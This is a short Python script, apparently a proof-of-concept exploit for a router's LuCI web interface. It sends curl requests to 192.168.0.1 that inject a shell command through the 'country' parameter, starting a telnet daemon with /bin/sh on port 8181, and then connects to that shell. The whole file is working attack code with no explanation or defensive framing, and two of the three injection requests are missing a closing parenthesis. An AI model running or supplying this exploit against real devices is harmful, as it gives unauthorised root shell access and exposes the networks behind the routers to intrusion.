
import os
import time

os.system("curl 'http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(telnetd%20-l%20/bin/sh%20-p%208181)'") 
time.sleep(5)
os.system("curl 'http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(telnetd%20-l%20/bin/sh%20-p%208181'")
time.sleep(5)
os.system("curl 'http://192.168.0.1/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(telnetd%20-l%20/bin/sh%20-p%208181'")
os.system("telnet 192.168.0.1 8181")
